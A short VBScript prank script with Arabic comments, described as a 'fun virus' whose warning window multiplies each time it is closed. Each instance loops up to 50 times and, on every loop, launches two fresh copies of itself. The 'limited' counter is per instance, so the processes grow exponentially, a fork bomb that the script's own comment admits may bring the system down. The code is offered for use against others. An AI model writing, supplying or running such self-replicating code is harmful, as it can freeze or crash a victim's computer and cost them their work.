
' =============================================
' كود VBS لنافذة تتكاثر كلما أغلقتها
' (تحذير: هذا كود مرح/مضايقة - قد يسبب إغلاق النظام إذا تركته يعمل)
' =============================================

Dim WshShell
Set WshShell = CreateObject("WScript.Shell")

Dim i
i = 0

Do While i < 50   ' يمكنك تغيير الرقم للتحكم في عدد المرات الأولية
    MsgBox "هذه النافذة تتكاثر كلما أغلقتها!" & vbCrLf & _
           "اضغط OK للاستمرار...", vbCritical + vbOKOnly, "تحذير - فيروس مرح"
    
    ' كل مرة تغلق فيها النافذة، يتم تشغيل نسختين جديدتين
    WshShell.Run "wscript.exe """ & WScript.ScriptFullName & """", 1, False
    WshShell.Run "wscript.exe """ & WScript.ScriptFullName & """", 1, False
    
    i = i + 1
Loop

MsgBox "انتهى العدد المحدود!", vbInformation, "انتهى"
